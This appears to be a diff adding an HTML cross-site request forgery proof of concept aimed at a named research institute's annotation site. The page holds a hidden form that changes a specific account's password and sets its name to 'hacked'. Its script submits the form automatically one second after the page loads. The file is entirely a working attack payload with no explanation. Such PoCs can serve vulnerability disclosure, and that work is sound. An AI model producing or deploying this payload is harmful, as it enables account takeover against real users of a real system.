@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Submit Form</title>
+</head>
+<body>
+
+    <form id="myForm" action="https://annotator.bii.a-star.edu.sg/annie/EditUserPrefs.do" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="urnparam" value="bio:user:ywhtestastar@yopmail.com" />
+        <input type="hidden" name="fullName" value="hacked" />
+        <input type="hidden" name="newPasswd" value="Nb1b3kTest@" />
+        <input type="hidden" name="repeatNewPasswd" value="Nb1b3kTest@" />
+        <input type="hidden" name="modellerKey" value="" />
+        <input type="hidden" name="defaultGroup" value="bio:group:eis" />
+        <input type="hidden" name="submitAction" value="Change" />
+        <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById("myForm").submit();
+            }, 1000); // 1000 milliseconds delay
+        };
+    </script>
+
+</body>
+</html>
